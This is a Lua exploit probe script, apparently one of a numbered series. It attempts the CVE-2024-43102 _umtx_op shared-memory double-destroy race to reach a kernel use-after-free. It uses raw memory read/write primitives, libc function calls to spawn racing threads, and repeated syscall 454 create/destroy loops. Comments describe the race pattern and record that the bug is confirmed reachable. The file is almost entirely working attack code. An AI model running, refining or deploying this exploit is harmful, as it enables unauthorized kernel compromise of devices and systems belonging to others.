-- CRASH_CLASS: HIGH
-- PROBE 152e: SHM race with correct fcall() API for threading
--
-- Context: 152c/152d crashed because they used native.fcall_with_rax
-- for Thrd_create — wrong API. 126g/126h confirmed fcall() is correct:
--   local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
--   pcall(thrd_create_fn, thr_buf, func_addr, arg)
--
-- CVE-2024-43102 status: double-destroy returns 0 both times,
-- alive() returns 0 after destroy. Attack surface confirmed open.

print("=== PROBE 152e: SHM RACE (CORRECT API) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function fmt_addr(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

collectgarbage("stop")
local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- Check required globals
if not libc_addrofs then
    print("ERROR: libc_addrofs not available")
    print("canary=" .. pid)
    return
end
if not libc_addrofs.Thrd_create then
    print("ERROR: Thrd_create not in libc_addrofs")
    print("canary=" .. pid)
    return
end

local sc_umtx = make_syscall(454)

-- Build callable wrappers
local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)
print("Thrd_create=" .. tostring(libc_addrofs.Thrd_create))
print("Atomic_add=" .. tostring(libc_addrofs.Atomic_fetch_add_8))

-- ============================================================
-- SECTION A: Verify threading works
-- ============================================================
print("")
print("--- SECTION A: THREAD VERIFY ---")

local shared = memory.alloc(64)
memory.write_qword(shared, uint64(0x1000))

local thr_buf = memory.alloc(8)
memory.write_qword(thr_buf, uint64(0))

local ok_t, ret_t = pcall(thrd_create_fn, thr_buf, libc_addrofs.Atomic_fetch_add_8, shared)
print("Thrd_create: ok=" .. tostring(ok_t) .. " ret=" .. tostring(ret_t))

if ok_t and to_num(ret_t) == 0 then
    sleep(0.1, 's')
    local thr_id = memory.read_qword(thr_buf)
    print("thr_id=" .. tostring(thr_id))
    pcall(thrd_join_fn, thr_id, uint64(0))
    local after = memory.read_qword(shared)
    print("shared: " .. fmt_addr(after) .. " (was 0x1000)")
    print("THREADING CONFIRMED")
else
    print("Thrd_create failed — can't do threaded race")
    print("canary=" .. pid)
    return
end

-- ============================================================
-- SECTION B: Threaded SHM race
-- Spawn threads doing atomic increments for heap pressure
-- Main thread does rapid SHM create/double-destroy
-- ============================================================
print("")
print("--- SECTION B: THREADED SHM RACE ---")

local key = memory.alloc(0x20)
local race_counter = memory.alloc(64)
memory.write_qword(race_counter, uint64(0))

-- Spawn 3 worker threads
local threads = {}
for i = 1, 3 do
    local tb = memory.alloc(8)
    memory.write_qword(tb, uint64(0))
    local ok, ret = pcall(thrd_create_fn, tb, libc_addrofs.Atomic_fetch_add_8, race_counter)
    if ok and to_num(ret) == 0 then
        local tid = memory.read_qword(tb)
        threads[#threads + 1] = tid
        print("thread" .. i .. "=" .. tostring(tid))
    else
        print("thread" .. i .. " FAIL: " .. tostring(ret))
    end
end
print("spawned=" .. #threads)

-- SHM race while threads are running
local dd_both_zero = 0
local total = 0
for i = 1, 100 do
    memory.write_qword(key, uint64(0xAA000000 + i))

    -- Create
    pcall(function()
        sc_umtx(uint64(to_num(key)), uint64(25), uint64(1), uint64(0), uint64(0))
    end)

    -- Double destroy
    local ok1, r1 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)
    local ok2, r2 = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(4), uint64(0), uint64(0))
    end)

    if ok1 and ok2 then
        local rv1, rv2 = to_num(r1), to_num(r2)
        if rv1 == 0 and rv2 == 0 then dd_both_zero = dd_both_zero + 1 end
    end
    total = total + 1
end
print(string.format("total=%d dd_both_zero=%d", total, dd_both_zero))

-- Join threads
for _, tid in ipairs(threads) do
    pcall(thrd_join_fn, tid, uint64(0))
end
local ctr = safe_rq(race_counter)
print("counter=" .. fmt_addr(ctr))
print("threads joined")

-- ============================================================
-- SECTION C: Post-race state check
-- ============================================================
print("")
print("--- SECTION C: POST-RACE ---")

-- Check alive on race keys
local alive_count = 0
for i = 1, 20 do
    memory.write_qword(key, uint64(0xAA000000 + i))
    local ok, ret = pcall(function()
        return sc_umtx(uint64(to_num(key)), uint64(25), uint64(8), uint64(0), uint64(0))
    end)
    if ok and to_num(ret) == 0 then alive_count = alive_count + 1 end
end
print("alive_after_dd=" .. alive_count .. "/20")

-- ============================================================
-- SECTION D: Interleaved create-on-other-thread while destroying
-- This is the actual CVE-2024-43102 race pattern:
-- Thread A: create SHM with key K → finds existing → grabs ref
-- Thread B: destroy SHM with key K → drops ref → refcount=0 → free
-- Thread A: uses freed ref → UAF
-- ============================================================
print("")
print("--- SECTION D: CONCURRENT CREATE/DESTROY ---")

-- For this we need the thread to call _umtx_op itself
-- Atomic_fetch_add doesn't do SHM ops
-- We need a way to make the thread call sc_umtx
-- Option: use fcall to call _umtx_op directly from the thread

-- First, find the actual _umtx_op libc entry
-- We can test: does the thread's atomic counter even change?
local test_ctr = memory.alloc(64)
memory.write_qword(test_ctr, uint64(0))

local tb2 = memory.alloc(8)
memory.write_qword(tb2, uint64(0))
local ok_t2, ret_t2 = pcall(thrd_create_fn, tb2, libc_addrofs.Atomic_fetch_add_8, test_ctr)
if ok_t2 and to_num(ret_t2) == 0 then
    -- While thread increments, we do SHM on same key
    local race_key = memory.alloc(0x20)
    memory.write_qword(race_key, uint64(0xDEAD0001))

    local race_hits = 0
    for i = 1, 50 do
        -- Create
        pcall(function()
            sc_umtx(uint64(to_num(race_key)), uint64(25), uint64(1), uint64(0), uint64(0))
        end)
        -- Destroy
        pcall(function()
            sc_umtx(uint64(to_num(race_key)), uint64(25), uint64(4), uint64(0), uint64(0))
        end)
        -- Double destroy
        local ok_dd, r_dd = pcall(function()
            return sc_umtx(uint64(to_num(race_key)), uint64(25), uint64(4), uint64(0), uint64(0))
        end)
        if ok_dd and to_num(r_dd) == 0 then race_hits = race_hits + 1 end
    end
    print("race_dd_success=" .. race_hits .. "/50")

    local tid2 = memory.read_qword(tb2)
    pcall(thrd_join_fn, tid2, uint64(0))
    local test_val = safe_rq(test_ctr)
    print("test_counter=" .. fmt_addr(test_val))
end

print("")
print("canary=" .. to_num(syscall.getpid()))
print("=== PROBE 152e COMPLETE ===")
